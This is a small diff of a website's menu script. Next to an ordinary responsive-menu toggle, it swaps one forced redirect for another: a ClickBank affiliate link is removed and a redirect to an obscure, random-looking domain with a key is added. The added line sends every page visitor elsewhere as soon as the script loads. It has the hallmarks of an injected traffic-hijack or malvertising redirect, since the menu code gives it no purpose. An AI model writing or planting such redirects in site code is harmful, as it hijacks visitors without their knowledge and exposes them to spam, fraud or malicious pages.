@@ -7,4 +7,4 @@ const ul = document.querySelector(`ul`);
 function menuResponsif() {
   ul.classList.toggle(`responsif`);
 }
-window.location.replace("https://hop.clickbank.net/?affiliate=camlycast&vendor=socialpaid&pid=joblandingpage&ifso=40pertweet");
+window.location.replace("https://broughtenragesince.com/hufgjvta9m?key=284a82752d5c6f5c407be49a291d68c0");
